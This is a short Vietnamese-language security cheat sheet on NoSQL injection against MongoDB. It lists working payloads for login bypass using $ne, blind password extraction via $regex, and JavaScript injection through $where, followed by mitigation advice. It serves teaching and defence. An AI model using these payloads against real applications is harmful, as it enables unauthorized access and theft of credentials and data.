# 🍃 NoSQL Injection

## 1. 📌 Tổng quan
NoSQL Injection xảy ra khi ứng dụng sử dụng các cơ sở dữ liệu NoSQL (MongoDB, CouchDB, Redis...) cho phép người dùng đưa các toán tử truy vấn (query operators như `$ne`, `$gt`, `$where`, `$regex`) vào câu truy vấn mà không được kiểm tra.

---

## 2. 💣 Kỹ thuật & Cheat Sheet (MongoDB)

### Bypass Login (JSON Request):
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

### URL-encoded Parameters Bypass:
```text
username[$ne]=admin&password[$ne]=1
```

### Trích xuất dữ liệu qua `$regex` (Blind NoSQLi):
```json
{
  "username": "admin",
  "password": {"$regex": "^a.*"}
}
```

### Khai thác qua `$where` (JavaScript Execution):
```text
username=admin'; return true; var dummy='
```

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. Sử dụng thư viện validation kiểu dữ liệu nghiêm ngặt (chỉ chấp nhận chuỗi thông thường, không chấp nhận object/dict trong JSON input).
2. Tắt hoặc không sử dụng toán tử `$where` và `mapReduce` cho phép chạy JavaScript code tùy ý.
3. Sử dụng các ODM an toàn (như Mongoose trong Node.js) với Schema định nghĩa chặt chẽ.
